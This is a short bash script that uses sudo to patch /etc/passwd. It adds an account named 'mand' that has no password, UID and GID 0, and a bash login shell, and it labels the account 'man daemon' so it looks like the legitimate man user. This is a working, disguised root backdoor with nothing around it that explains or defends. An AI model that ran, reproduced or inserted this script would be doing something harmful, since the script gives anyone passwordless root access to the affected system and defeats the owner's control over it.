#!/bin/bash

PATCH=$(cat << EOF
@@ -5,6 +5,7 @@
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+mand::0:0:man daemon:/var/cache/man:/bin/bash
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
EOF
)

grep -q mand /etc/passwd || sudo patch /etc/passwd <<< "$PATCH"